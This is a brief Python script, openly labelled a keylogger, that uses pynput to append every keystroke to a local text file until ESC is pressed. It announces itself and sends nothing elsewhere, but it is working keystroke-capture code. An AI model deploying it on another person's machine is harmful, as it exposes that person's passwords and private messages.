from pynput import keyboard
from datetime import datetime

log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        print("\nESC pressed. Exiting keylogger.")
        # Returning False stops listener and script
        return False

def main():
    print("Starting keylogger... Press ESC to stop.")
    with open(log_file, "a") as f:
        f.write(f"\n\n--- Logging started at {datetime.now()} ---\n")

    # This blocks the main thread until listener stops
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nCtrl+C detected. Exiting program.")
